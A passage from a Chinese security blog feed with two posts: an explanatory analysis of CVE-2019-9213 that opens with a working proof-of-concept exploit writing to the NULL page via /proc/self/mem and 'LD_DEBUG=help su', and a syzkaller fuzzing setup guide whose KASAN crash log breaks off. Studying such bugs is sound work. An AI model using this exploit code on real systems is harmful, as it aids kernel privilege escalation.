&lt;err.h&gt;</span><br><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;unistd.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line">#include &lt;fcntl.h&gt;</span><br><span class="line"></span><br><span class="line">int main(void) &#123;</span><br><span class="line">  void *map = mmap((void*)0x10000, 0x1000, PROT_READ|PROT_WRITE,</span><br><span class="line">                   MAP_PRIVATE|MAP_ANONYMOUS|MAP_GROWSDOWN|MAP_FIXED, -1, 0);</span><br><span class="line">  if (map == MAP_FAILED) err(1, &quot;mmap&quot;);</span><br><span class="line">  int fd = open(&quot;/proc/self/mem&quot;, O_RDWR);</span><br><span class="line">  if (fd == -1) err(1, &quot;open&quot;);</span><br><span class="line">  unsigned long addr = (unsigned long)map;</span><br><span class="line">  while (addr != 0) &#123;</span><br><span class="line">    addr -= 0x1000;</span><br><span class="line">    if (lseek(fd, addr, SEEK_SET) == -1) err(1, &quot;lseek&quot;);</span><br><span class="line">    char cmd[1000];</span><br><span class="line">    sprintf(cmd, &quot;LD_DEBUG=help su 1&gt;&amp;%d&quot;, fd);</span><br><span class="line">    system(cmd);</span><br><span class="line">  &#125;</span><br><span class="line">  system(&quot;head -n1 /proc/$PPID/maps&quot;);</span><br><span class="line">  printf(&quot;data at NULL: 0x%lx\n&quot;, *(unsigned long *)0);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>详细的函数调用分析安全客也有，这篇主要是分析一下前置知识使我们能够看懂poc</p><h2 id="0x00-proc-self-mem文件"><a href="#0x00-proc-self-mem文件" class="headerlink" title="0x00 /proc/self/mem文件"></a>0x00 /proc/self/mem文件</h2><p>我们知道proc这个文件夹是一个虚拟的文件目录，这个文件夹储存的都是一些系统的东西，参考 ：</p><ul><li><a href="http://man7.org/linux/man-pages/man5/proc.5.html" target="_blank" rel="noopener">http://man7.org/linux/man-pages/man5/proc.5.html</a></li></ul><p>从这个链接我们可以看出，/proc/[pid]这个目录储存的是和进程有关信息，而/proc/self是一个链接，指向/proc/[current pid] </p><p>而/proc/self/mem这个文件就是当前进程的内存映射，我们可以read()、open()和lseek()，事实上我们还能write()写一段poc验证一下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;sys/mman.h&gt;</span><br><span class="line">#include &lt;err.h&gt;</span><br><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;unistd.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line">#include &lt;fcntl.h&gt;</span><br><span class="line">#include&lt;string.h&gt;</span><br><span class="line">int main(void) &#123;</span><br><span class="line">    void *map = mmap((void*)0x10000, 0x1000, PROT_READ|PROT_WRITE,MAP_PRIVATE|MAP_ANONYMOUS|MAP_GROWSDOWN|MAP_FIXED, -1, 0);</span><br><span class="line">    if (map == MAP_FAILED) err(1, &quot;mmap&quot;);</span><br><span class="line">    int fd = open(&quot;/proc/self/mem&quot;, O_RDWR);</span><br><span class="line">    if (fd == -1) err(1, &quot;open&quot;);</span><br><span class="line">    unsigned long addr = (unsigned long)map;</span><br><span class="line">    if (lseek(fd, addr, SEEK_SET) == -1) err(1, &quot;lseek&quot;);</span><br><span class="line">    char cmd[0x100];</span><br><span class="line">    memset(cmd,255,0x100);</span><br><span class="line">    write(fd,cmd,0x100);</span><br><span class="line">    printf(&quot;data at 0x10000: 0x%llx\n&quot;, *(unsigned long *)0x10000);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>结果：</p><p><img src="/2020/03/26/cve-2019-9213/mem_poc.png" alt=""></p><p>那么问题来了，/proc/self/mem这个文件的权限是</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-rw-------. 1 pwnht pwnht 0 Mar 27 01:28 /proc/self/mem</span><br></pre></td></tr></table></figure><p>那么我们知道，一个进程的每个内存页不一定是相同的，那么你没有写权限的页，你去写会有什么事情发生呢，<strong>仍然可以写入</strong> 有点bug的感觉 。。。。大家自行验证，只需要让上述poc的mmap的内存没有写权限即可</p><h2 id="0x01-LD-DEBUG"><a href="#0x01-LD-DEBUG" class="headerlink" title="0x01 LD_DEBUG"></a>0x01 LD_DEBUG</h2><p>LD_DEBUG其实是个环境变量，这个环境变量主要用于一个程序调用多个动态链接库时，很难去定位错误的情况,然后用法就是</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">LD_DEBUG=option program arg1 arg2...</span><br></pre></td></tr></table></figure><p>比如：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">LD_DEBUG=help /bin/bash</span><br></pre></td></tr></table></figure><p>然后选项的话就有下面几个</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">libs        display library search paths</span><br><span class="line">reloc       display relocation processing</span><br><span class="line">files       display progress for input file</span><br><span class="line">symbols     display symbol table processing</span><br><span class="line">bindings    display information about symbol binding</span><br><span class="line">versions    display version dependencies</span><br><span class="line">scopes      display scope information</span><br><span class="line">all         all previous options combined</span><br><span class="line">statistics  display relocation statistics</span><br><span class="line">unused      determined unused DSOs</span><br><span class="line">help        display this help message and exit</span><br></pre></td></tr></table></figure><p>从poc可以看出我们利用LD_DEBUG让root权限调用mem_write()函数,其实，<strong>这里我有点不明白了，为啥LD_DEBUG=help su 1&gt;fd</strong> 就可以root权限调用，<strong>su 1&gt;fd</strong> 就不行。。。。</p><h2 id="0x02-lseek-函数"><a href="#0x02-lseek-函数" class="headerlink" title="0x02 lseek()函数"></a>0x02 lseek()函数</h2><p>参考： <a href="https://blog.csdn.net/songyang516/article/details/6779950" target="_blank" rel="noopener">https://blog.csdn.net/songyang516/article/details/6779950</a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">static const struct file_operations proc_mem_operations = &#123;</span><br><span class="line">.llseek= mem_lseek,</span><br><span class="line">.read= mem_read,</span><br><span class="line">.write= mem_write,</span><br><span class="line">.open= mem_open,</span><br><span class="line">.release= mem_release,</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>我可以从参考链接可以知道lseek()可以设置打开文件的当前偏移，write()函数和read()函数写入的时候，都是从这个偏移开始的，然后当调用lseek()函数的时候，就会调用mem_lseek()函数，这个函数很简单</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">loff_t mem_lseek(struct file *file, loff_t offset, int orig)</span><br><span class="line">&#123;</span><br><span class="line">switch (orig) &#123;</span><br><span class="line">case 0:</span><br><span class="line">file-&gt;f_pos = offset;</span><br><span class="line">break;</span><br><span class="line">case 1:</span><br><span class="line">file-&gt;f_pos += offset;</span><br><span class="line">break;</span><br><span class="line">default:</span><br><span class="line">return -EINVAL;</span><br><span class="line">&#125;</span><br><span class="line">force_successful_syscall_return();</span><br><span class="line">return file-&gt;f_pos;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到没有任何check，kernel的switch直接用数字还是不常见的，其实kernel也有seek的宏</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">#define SEEK_SET0/* seek relative to beginning of file */</span><br><span class="line">#define SEEK_CUR1/* seek relative to current file position */</span><br><span class="line">#define SEEK_END2/* seek relative to end of file */</span><br></pre></td></tr></table></figure><h2 id="0x03-mem-write-函数"><a href="#0x03-mem-write-函数" class="headerlink" title="0x03 mem_write()函数"></a>0x03 mem_write()函数</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">static ssize_t mem_write(struct file *file, const char __user *buf,</span><br><span class="line"> size_t count, loff_t *ppos)</span><br><span class="line">&#123;</span><br><span class="line">return mem_rw(file, (char __user*)buf, count, ppos, 1);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到这个函数有四个参数，前三个参数就是我们传的三个参数，第四个参数就是我们用lseek()函数设置的offset，然后我们可以在看看mem_read()函数,对比一下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">static ssize_t mem_read(struct file *file, char __user *buf,</span><br><span class="line">size_t count, loff_t *ppos)</span><br><span class="line">&#123;</span><br><span class="line">return mem_rw(file, buf, count, ppos, 0);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>发现他们只有只有第五个参数不一样，也就是flag标志位,之后再看mem_rw()函数</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line">static ssize_t mem_rw(struct file *file, char __user *buf,</span><br><span class="line">size_t count, loff_t *ppos, int write)</span><br><span class="line">&#123;</span><br><span class="line">struct mm_struct *mm = file-&gt;private_data;</span><br><span class="line">unsigned long addr = *ppos;</span><br><span class="line">ssize_t copied;</span><br><span class="line">char *page;</span><br><span class="line">unsigned int flags;</span><br><span class="line"></span><br><span class="line">if (!mm)</span><br><span class="line">return 0;</span><br><span class="line"></span><br><span class="line">page = (char *)__get_free_page(GFP_KERNEL);</span><br><span class="line">if (!page)</span><br><span class="line">return -ENOMEM;</span><br><span class="line"></span><br><span class="line">copied = 0;</span><br><span class="line">if (!mmget_not_zero(mm))</span><br><span class="line">goto free;</span><br><span class="line"></span><br><span class="line">flags = FOLL_FORCE | (write ? FOLL_WRITE : 0);</span><br><span class="line"></span><br><span class="line">while (count &gt; 0) &#123;</span><br><span class="line">int this_len = min_t(int, count, PAGE_SIZE);</span><br><span class="line"></span><br><span class="line">if (write &amp;&amp; copy_from_user(page, buf, this_len)) &#123;</span><br><span class="line">copied = -EFAULT;</span><br><span class="line">break;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">this_len = access_remote_vm(mm, addr, page, this_len, flags);</span><br><span class="line">if (!this_len) &#123;</span><br><span class="line">if (!copied)</span><br><span class="line">copied = -EIO;</span><br><span class="line">break;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if (!write &amp;&amp; copy_to_user(buf, page, this_len)) &#123;</span><br><span class="line">copied = -EFAULT;</span><br><span class="line">break;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">buf += this_len;</span><br><span class="line">addr += this_len;</span><br><span class="line">copied += this_len;</span><br><span class="line">count -= this_len;</span><br><span class="line">&#125;</span><br><span class="line">*ppos = addr;</span><br><span class="line"></span><br><span class="line">mmput(mm);</span><br><span class="line">free:</span><br><span class="line">free_page((unsigned long) page);</span><br><span class="line">return copied;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后再体会一下作者说的</p><blockquote><p>在while循环中，如果是写首先通过copy_from_user函数将待写内容buf拷贝到分配的page中，然后调用access_remote_vm函数写入远程进程。读则相反，先调用access_remote_vm函数读取远程进程中的数据，然后调用copy_to_user函数将读取的page拷贝到buf中。</p></blockquote><p>如果调用的mem_write()函数，则在mem_rw()参数中，write参数为1,那么他就会执行while循环的</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">int this_len = min_t(int, count, PAGE_SIZE);</span><br><span class="line"></span><br><span class="line">if (write &amp;&amp; copy_from_user(page, buf, this_len)) &#123;</span><br><span class="line">copied = -EFAULT;</span><br><span class="line">break;</span><br><span class="line">&#125;</span><br><span class="line">this_len = access_remote_vm(mm, addr, page, this_len, flags);</span><br><span class="line">if (!this_len) &#123;</span><br><span class="line">if (!copied)</span><br><span class="line">copied = -EIO;</span><br><span class="line">break;</span><br><span class="line">&#125;</span><br><span class="line">buf += this_len;</span><br><span class="line">addr += this_len;</span><br><span class="line">copied += this_len;</span><br><span class="line">count -= this_len;</span><br></pre></td></tr></table></figure><p>如果调用的是mem_read()函数在会调用</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">this_len = access_remote_vm(mm, addr, page, this_len, flags);</span><br><span class="line">if (!this_len) &#123;</span><br><span class="line">if (!copied)</span><br><span class="line">copied = -EIO;</span><br><span class="line">break;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if (!write &amp;&amp; copy_to_user(buf, page, this_len)) &#123;</span><br><span class="line">copied = -EFAULT;</span><br><span class="line">break;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">buf += this_len;</span><br><span class="line">addr += this_len;</span><br><span class="line">copied += this_len;</span><br><span class="line">count -= this_len;</span><br></pre></td></tr></table></figure><p>之后安全课都有详细分析不再赘述</p><h1 id="0x01-调试poc"><a href="#0x01-调试poc" class="headerlink" title="0x01 调试poc"></a>0x01 调试poc</h1><p>这个poc直接用gdb调试很难调试，因为他调用了system（）函数，比较有意思的是system（）函数会clone出一个子进程，主进程会调用wait4（）函数等待子进程结束，然后gdb就会自动转到这个子进程，这样的话，断点就会失效，你如果continue的话程序就直接结束了，一种解决方案就是在 <strong>while</strong> 循环结束后加一个getchar（）这样的话主进程就会停住，开一个gdb attach这个进程就好了</p><h1 id="0x04-参考链接"><a href="#0x04-参考链接" class="headerlink" title="0x04 参考链接"></a>0x04 参考链接</h1><p><a href="https://www.anquanke.com/post/id/173356" target="_blank" rel="noopener">https://www.anquanke.com/post/id/173356</a></p>]]></content>
    
    <summary type="html">
    
      一个比较神奇的漏洞，记录一下
    
    </summary>
    
    
    
      <category term="cve,linux kernel" scheme="http://yoursite.com/tags/cve-linux-kernel/"/>
    
  </entry>
  
  <entry>
    <title>syz fuzz初探</title>
    <link href="http://yoursite.com/2020/03/22/syz-fuzz%E5%88%9D%E6%8E%A2/"/>
    <id>http://yoursite.com/2020/03/22/syz-fuzz初探/</id>
    <published>2020-03-22T09:26:52.000Z</published>
    <updated>2020-05-24T14:57:12.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="0x00-环境搭建"><a href="#0x00-环境搭建" class="headerlink" title="0x00 环境搭建"></a>0x00 环境搭建</h1><h2 id="0x00-编译syzkaller"><a href="#0x00-编译syzkaller" class="headerlink" title="0x00 编译syzkaller"></a>0x00 编译syzkaller</h2><h3 id="0x00-go-get-syzkaller"><a href="#0x00-go-get-syzkaller" class="headerlink" title="0x00 go get syzkaller"></a>0x00 go get syzkaller</h3><p>在ubuntu下没有搭建失败，在manjaro比较顺利,首先安装go</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo pacman -S go</span><br></pre></td></tr></table></figure><p>然后环境变量就自己配置好了，比较方便，然后,参考·<a href="https://www.freebuf.com/sectool/142969.html" target="_blank" rel="noopener">https://www.freebuf.com/sectool/142969.html</a></p><p>这个链接进行设置，go默认get的路径应该在 <strong>/home/user/go</strong> ,之后按照链接make就好了</p><h3 id="0x01-生成镜像"><a href="#0x01-生成镜像" class="headerlink" title="0x01 生成镜像"></a>0x01 生成镜像</h3><p>利用 <strong>syzkaller/tools/create-img.sh</strong> 生成镜像，由于官方镜像下载很慢，所以，考虑国内源，把create-img.sh的</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo debootstrap --include=$PREINSTALL_PKGS --components=main,contrib,non-free $RELEASE $DIR</span><br></pre></td></tr></table></figure><p>改成</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo debootstrap --include=$PREINSTALL_PKGS --components=main,contrib,non-free $RELEASE $DIR http://mirrors.163.com/debian/</span><br></pre></td></tr></table></figure><p>就会快很多</p><h3 id="0x02-编译kernel"><a href="#0x02-编译kernel" class="headerlink" title="0x02 编译kernel"></a>0x02 编译kernel</h3><p>参考 <a href="https://github.com/google/syzkaller/blob/master/docs/linux/setup_ubuntu-host_qemu-vm_x86-64-kernel.md" target="_blank" rel="noopener">https://github.com/google/syzkaller/blob/master/docs/linux/setup_ubuntu-host_qemu-vm_x86-64-kernel.md</a></p><p>注意一共要加6个编译选项</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">CONFIG_KCOV=y</span><br><span class="line">CONFIG_DEBUG_INFO=y</span><br><span class="line">CONFIG_KASAN=y</span><br><span class="line">CONFIG_KASAN_INLINE=y</span><br><span class="line">CONFIG_CONFIGFS_FS=y</span><br><span class="line">CONFIG_SECURITYFS=y</span><br></pre></td></tr></table></figure><p>然后我遇到的问题是fuzz的crash信息不显示在哪个c文件的第几行crash的，而我的队友却显示。。。。</p><h1 id="0x01-开始fuzz"><a href="#0x01-开始fuzz" class="headerlink" title="0x01 开始fuzz"></a>0x01 开始fuzz</h1><p>我的运气比较好在fuzz一段时间之后，fuzz出了两个漏洞</p><p><img src="/2020/03/22/syz-fuzz初探/web.png" alt=""></p><p><img src="/2020/03/22/syz-fuzz初探/tty.png" alt=""></p><p>虽然没有什么攻击性。。。。，就没想过交，又因为ghidra解析不了vmlinux，导致我分析很慢，各种问题。。。不是因为内存不够就是硬盘不足。。。。其中一个被今天修复了，其中 <strong>release_tty</strong> 那个漏洞今天被修复了</p><p><img src="/2020/03/22/syz-fuzz初探/kernel_patch.png" alt=""></p><h1 id="0x02-漏洞分析"><a href="#0x02-漏洞分析" class="headerlink" title="0x02 漏洞分析"></a>0x02 漏洞分析</h1><p>我一开始是从我的dump文件分析的</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br></pre></td><td class="code"><pre><span class="line">Syzkaller hit &apos;KASAN: use-after-free Write in release_tty&apos; bug.</span><br><span class="line"></span><br><span class="line">==================================================================</span><br><span class="line">BUG: KASAN: use-after-free in con_shutdown+0x7f/0x90</span><br><span class="line">Write of size 8 at addr ffff888065b12888 by task syz-executor532/328</span><br><span class="line"></span><br><span class="line">CPU: 1 PID: 328 Comm: syz-executor532 Not tainted 5.6.0-rc6+ #1</span><br><span class="line">Hardware name: QEMU Standard PC (i440FX + PIIX, 1996), BIOS ?-20191223_100556-anatol 04/01/2014</span><br><span class="line">Call Trace:</span><br><span class="line"> dump_stack+0x95/0xce</span><br><span class="line"> print_address_description.constprop.0+0x16/0x200</span><br><span class="line"> __kasan_report.cold+0x37/0x77</span><br><span class="line"> kasan_report+0xe/0x20</span><br><span class="line"> con_shutdown+0x7f/0x90</span><br><span class="line"> release_tty+0xb6/0x440</span><br><span class="line"> tty_release_struct+0x35/0x50</span><br><span class="line"> tty_release+0xac6/0xdb0</span><br><span class="line"> __fput+0x26d/0x760</span><br><span class="line"> task_work_run+0x144/0x1c0</span><br><span class="line"> do_exit+0x975/0x2750</span><br><span class="line"> do_group_exit+0xee/0x310</span><br><span class="line"> __x64_sys_exit_group+0x3a/0x50</span><br><span class="line"> do_syscall_64+0x9c/0x390</span><br><span class="line"> entry_SYSCALL_64_after_hwframe+0x44/0xa9</span><br><span class="line">RIP: 0033:0x43ee26</span><br><span class="line">Code: Bad RIP value.</span><br><span class="line">RSP: 002b:00007ffc5c942448 EFLAGS: 00000246 ORIG_RAX: 00000000000000e7</span><br><span class="line">RAX: ffffffffffffffda RBX: 00000000004b03b0 RCX: 000000000043ee26</span><br><span class="line">RDX: 0000000000000000 RSI: 000000000000003c RDI: 0000000000000000</span><br><span class="line">RBP: 0000000000000000 R08: 00000000000000e7 R09: ffffffffffffffc0</span><br><span class="line">R10: 0000000000000000 R11: 0000000000000246 R12: 00000000004b03b0</span><br><span class="line">R13: 0000000000000001 R14: 0000000000000000 R15: 0000000000000001</span><br><span class="line"></span><br><span class="line">Allocated by task 328:</span><br><span class="line"> save_stack+0x1b/0x80</span><br><span class="line"> __kasan_kmalloc.constprop.0+0xc2/0xd0</span><br><span class="line"> vc_allocate+0x1c0/0x690</span><br><span class="line"> con_install+0x4d/0x3e0</span><br><span class="line"> tty_init_dev+0xe9/0x420</span><br><span class="line"> tty_open+0x414/0xa70</span><br><span class="line"> chrdev_open+0x209/0x510</span><br><span class="line"> do_dentry_open+0x439/0x1010</span><br><span class="line"> path_openat+0x1182/0x45d0</span><br><span class="line"> do_filp_open+0x192/0x260</span><br><span class="line"> do_sys_openat2+0x3f5/0x5a0</span><br><span class="line"> do_sys_open+0xb2/0x120</span><br><span class="line"> do_syscall_64+0x9c/0x390</span><br><span class="line"> entry_SYSCALL_64_after_hwframe+0x44/0xa9</span><br><span class="line"></span><br><span class="line">Freed by task 330:</span><br><span class="line"> save_stack+0x1b/0x80</span><br><span class="line"> __kasan_slab_free+0x12c/0x170</span><br><span class="line"> kfree+0x8c/0x230</span><br><span class="line"> vt_disallocate_all+0x276/0x380</span><br><span class="line"> vt_ioctl+0x1219/0x2560</span><br><span 